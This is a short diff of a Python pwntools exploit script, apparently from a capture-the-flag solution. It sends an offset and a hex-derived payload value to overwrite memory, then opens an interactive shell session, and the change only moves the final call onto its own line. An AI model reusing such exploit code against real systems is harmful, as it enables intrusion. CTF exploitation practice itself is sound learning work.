@@ -21,5 +21,6 @@ payload=zzz.group(1)
 
 p.sendline(str(dist).encode()) 
 p.recvuntil("What number would you like to replace it with?") 
-p.sendline(str(int(payload,16)).encode()) p.interactive()
+p.sendline(str(int(payload,16)).encode()) 
+p.interactive()
 ```
